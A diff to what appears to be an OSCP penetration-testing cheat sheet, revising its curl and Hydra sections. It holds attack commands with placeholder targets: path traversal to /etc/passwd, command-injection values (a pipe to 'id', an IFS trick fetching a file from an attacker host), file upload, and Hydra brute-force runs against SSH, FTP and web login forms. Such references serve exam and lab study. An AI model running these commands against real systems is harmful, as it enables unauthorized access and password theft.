@@ -485,17 +485,13 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 #### curl
 
 ```c
-curl -v http://<RHOST>
-curl -k <RHOST>
-curl -X POST http://<RHOST>
-curl -I POST http://<RHOST>
-curl -X PUT http://<RHOST>
-curl -vvv <RHOST>
-curl --head http://<RHOST>/
-curl --proxy http://127.0.0.1:8080
-curl -X POST http://<RHOST>/select --data 'db=whatever|id'
-curl --path-as-is http://<RHOST>/../../../../../../etc/passwd
-curl -s "http://<RHOST>/reports.php?report=2589" | grep Do -A8 | html2text
+curl -v http://<DOMAIN>                                                        // verbose output
+curl -X POST http://<DOMAIN>                                                   // use POST method
+curl -X PUT http://<DOMAIN>                                                    // use PUT method
+curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
+curl --proxy http://127.0.0.1:8080                                             // use proxy
+curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
+curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
 ```
 
 #### Chisel
@@ -2359,7 +2355,9 @@ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 #### Hydra
 
 ```c
-hydra <RHOST> -l <USERNAME> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<RHOST>
+hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
+hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
+hydra -C /PATH/TO/WORDLIST/<FILE> <RHOST> ftp
 ```
 
 ```c
@@ -2368,15 +2366,15 @@ unset HYDRA_PROXY
 ```
 
 ```c
-hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
 ```
 
 ```c
-hydra <RHOST> http-post-form -L /usr/share/wordlists/list "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /usr/share/wordlists/list
+hydra <RHOST> http-post-form -L /PATH/TO/WORDLIST/<FILE> "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /PATH/TO/WORDLIST/<FILE>
 
 hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
 
-hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+hydra -l admin -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
 ```
 
 #### John
